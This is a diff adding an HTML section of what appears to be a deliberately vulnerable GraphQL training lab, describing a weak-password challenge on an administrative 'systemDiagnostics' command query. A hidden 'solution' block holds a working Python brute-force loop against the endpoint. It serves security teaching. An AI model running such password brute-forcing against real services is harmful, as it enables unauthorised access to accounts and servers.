@@ -1,0 +1,37 @@
+<!-- Start -->
+<h3 style="color:purple" id="misc-weakpass"><b>Miscellaneous :: GraphQL Query Weak Password Protection</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  The query <code>systemDiagnostics</code> is an administrative functionality that allows running a subset of system
+  commands on the server. The query is governed by a username and password before processing the
+  command.
+</p>
+<p>
+  The password is weak, and the server has no rate limiting protections. This allows attackers to easily conduct brute
+  force attacks against the server.</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://cwe.mitre.org/data/definitions/307.html" target="_blank">
+      <i class="fa fa-newspaper"></i> CWE-307 - Improper Restriction of Excessive Authentication Attempts
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-misc-weakpass')">Show</button></h5>
+<div id="sol-misc-weakpass" style="display:none">
+  <pre class="bash">
+# Brute Force attack with a list of passwords:
+passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
+
+for password in passwordlist:
+  resp = requests.post('http://host/graphql',
+  json = {
+    "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
+    "variables":None
+  })
+
+  if not 'errors' in resp.text:
+    print('Password is', password)</pre>
+</div>
+<!-- End -->
